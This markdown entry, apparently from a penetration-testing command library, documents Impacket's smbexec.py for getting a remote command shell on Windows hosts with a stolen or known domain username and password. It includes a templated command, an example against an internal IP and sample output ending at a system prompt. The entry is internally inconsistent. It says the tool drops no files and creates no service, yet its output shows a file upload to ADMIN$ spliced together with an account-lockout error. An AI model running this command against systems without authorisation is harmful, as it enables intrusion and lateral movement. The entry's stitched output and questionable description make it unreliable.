---
id: 6efb9859-9e15-4147-940d-363bc6328bd9
name: impacket-smbexec-execute-command
type: command
executor: bash
data: 'smbexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP'
output: null
created_at: '2023-04-06T03:56:30.836980+00:00'
updated_at: '2023-10-10T20:37:57.936960+00:00'
platforms:
  - Windows
tags:
  - impacket
  - remote-execution
  - smb
verified: true
validated: true
---

# impacket-smbexec-execute-command

## Command

```bash
smbexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Description

Executes commands via SMB named pipes without dropping files, providing semi-interactive access. Stealthier alternative to PsExec as it avoids service creation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes (or empty for local) |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password for authentication | Yes |
| $_TARGET_IP | IP address or hostname of target | Yes |

## Examples

### Basic Usage

```bash
smbexec.py DOMAIN/user:pass@192.168.1.100
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] SMB SessionError: STATUS_ACCOUNT_LOCKED_OUT(0xC0000234)
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.1.100.....
[*] Found writable share ADMIN$\tmp
[*] Uploading file...
C:\Windows\system32>

## Related

- [[procedures/Remote-Command-Execution-with-Impacket-Using-Credentials]]
- [[tools/Impacket]]
